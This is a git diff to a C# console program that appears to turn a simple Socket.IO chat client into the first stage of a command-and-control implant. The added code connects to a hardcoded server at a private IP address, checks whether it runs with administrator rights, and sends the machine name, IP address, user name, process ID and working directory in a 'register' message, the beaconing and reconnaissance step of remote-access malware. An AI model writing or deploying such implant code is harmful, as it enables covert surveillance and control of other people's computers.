@@ -4,6 +4,14 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using SocketIOClient;
+using System.Net;
+using System.Security.Principal;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace ConsoleApp1
 {
@@ -11,22 +19,62 @@ namespace ConsoleApp1
     {
         static void Main(string[] args)
         {
-            DoStuff();
+            if (args.Length > 1)
+            {
+                Go(args[0]);
+            }
+            else
+            {
+                Go();
+            }
             while(true) { };
         }
-        static async void DoStuff()
+        static async void Go(string home = "http://172.16.113.1:3000/client")
         {
-            var client = new SocketIO("http://192.168.1.6:3000/client");
 
+            var client = new SocketIO(home);
             await client.ConnectAsync();
 
-            client.On("message", response =>
+            await client.EmitAsync("register", GetSysinfo());
+        }
+        public static string GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
             {
-                Console.WriteLine(response);
-                client.EmitAsync("message", response + "!");
-            });
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            return "0.0.0.0";
+        }
+        private static bool AmIHigh()
+        {
+            // returns true if the current process is running with adminstrative privs in a high integrity context
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
 
-            
+        static Dictionary<string,string> GetSysinfo()
+        {
+            string hostname = Environment.MachineName;
+            string ipaddr = GetLocalIPAddress();
+            string elevated = AmIHigh() ? "*" : "";
+            string username = elevated + WindowsIdentity.GetCurrent().Name;
+            string pid = Process.GetCurrentProcess().Id.ToString();
+            string process = Process.GetCurrentProcess().ProcessName + Process.GetCurrentProcess();
+            string pwd = Directory.GetCurrentDirectory();
+
+            return new Dictionary<string, string>() {
+                {"hostname", hostname},
+                {"ipaddr", ipaddr},
+                {"username", username},
+                {"pid", pid},
+                {"process", process},
+                {"pwd", pwd}
+            };
         }
     }
 }
